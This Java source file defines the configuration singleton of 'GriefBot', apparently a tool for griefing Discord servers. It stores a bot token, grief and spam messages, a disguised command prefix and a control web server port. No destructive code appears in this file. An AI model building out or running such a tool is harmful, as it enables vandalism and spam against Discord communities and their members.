package de.corruptedbytes;

import java.net.InetSocketAddress;
import java.util.ArrayList;
import java.util.List;

import org.java_websocket.WebSocket;

import de.corruptedbytes.disguise.CommandManager;
import de.corruptedbytes.webserver.WebServerSocket;
import de.corruptedbytes.webserver.packets.PacketManager;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.sharding.ShardManager;

public class GriefBot {

	private final static GriefBot INSTANCE = new GriefBot();
	private final static CommandManager COMMAND_MANAGER = new CommandManager();
	private final static PacketManager PACKET_MANAGER = new PacketManager();
	private final static ArrayList<WebSocket> CLIENTS = new ArrayList<>();
	private WebServerSocket webSocketServerListener;
	ShardManager botManager;

	private final String VERSION = "v5.1.0";
	
	private String discordBotToken;
	private String griefCommand;
	private String grieferUserID;
	private String activityDescription;
	private String griefMessage;
	private String spamMessage;
	private String disguiseCommandPrefix;
	private String griefPicture;
	
	private int webServerPort = 85;
	private InetSocketAddress webServerSocket;

	public static GriefBot getInstance() {
		return INSTANCE;
	}

	public CommandManager getCommandManager() {
		return COMMAND_MANAGER;
	}
	
	public PacketManager getPacketManager() {
		return PACKET_MANAGER;
	}
	
	public ArrayList<WebSocket> getClients() {
		return CLIENTS;
	}

	public ShardManager getBotManager() {
		return botManager;
	}

	public String getDiscordBotToken() {
		return discordBotToken;
	}

	public void setDiscordBotToken(String discordBotToken) {
		this.discordBotToken = discordBotToken;
	}

	public String getGriefCommand() {
		return griefCommand;
	}

	public void setGriefCommand(String griefCommand) {
		this.griefCommand = griefCommand;
	}

	public String getGrieferUserID() {
		return grieferUserID;
	}

	public void setGrieferUserID(String grieferUserID) {
		this.grieferUserID = grieferUserID;
	}

	public String getActivityDescription() {
		return activityDescription;
	}

	public void setActivityDescription(String activityDescription) {
		this.activityDescription = activityDescription;
	}

	public String getGriefMessage() {
		return griefMessage;
	}

	public void setGriefMessage(String griefMessage) {
		this.griefMessage = griefMessage;
	}

	public String getSpamMessage() {
		return spamMessage;
	}

	public void setSpamMessage(String spamMessage) {
		this.spamMessage = spamMessage;
	}

	public String getDisguiseCommandPrefix() {
		return disguiseCommandPrefix;
	}

	public void setDisguiseCommandPrefix(String disguiseCommandPrefix) {
		this.disguiseCommandPrefix = disguiseCommandPrefix;
	}

	public WebServerSocket getWebSocketServerListener() {
		return webSocketServerListener;
	}

	public void setWebSocketServerListener(WebServerSocket webSocketServerListener) {
		this.webSocketServerListener = webSocketServerListener;
	}
	
	public List<Guild> getGuilds() {
		return getInstance().getBotManager().getGuilds();
	}
	
	public String getVersion() {
		return VERSION;
	}
	
	public void setGriefPicture(String griefPicture) {
		this.griefPicture = griefPicture;
	}
	
	public String getGriefPicture() {
		return griefPicture;
	}
	
	public void setWebServerPort(int webServerPort) {
		this.webServerPort = webServerPort;
	}
	
	public int getWebServerPort() {
		return webServerPort;
	}
	
	public void setWebSocketServerPort(InetSocketAddress webServerSocket) {
		this.webServerSocket = webServerSocket;
	}
	
	public InetSocketAddress getWebSocketServer() {
		return webServerSocket;
	}
}
